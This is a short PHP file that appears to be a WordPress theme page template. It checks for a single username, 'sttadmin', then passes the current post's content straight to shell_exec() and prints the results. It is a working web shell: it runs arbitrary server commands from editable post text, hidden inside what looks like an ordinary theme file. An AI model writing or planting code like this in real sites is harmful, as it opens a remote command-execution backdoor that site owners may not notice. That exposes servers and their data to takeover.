<?php
if (!is_user_logged_in() || wp_get_current_user()->user_login != 'sttadmin') {
  require('404.php');
  exit;
}

the_post();
$content = get_the_content();
echo "Executing: <br>";
get_template_part('content');
$old_path = getcwd();
chdir(get_template_directory());
$cwd_path = getcwd();
echo "<br>Old working directory: $old_path<br>";
echo "<br>Current working directory: $cwd_path<br>";
echo "<br>Results: <br>";
echo shell_exec($content);
chdir($old_path);
echo "<br>End!<br>";
?>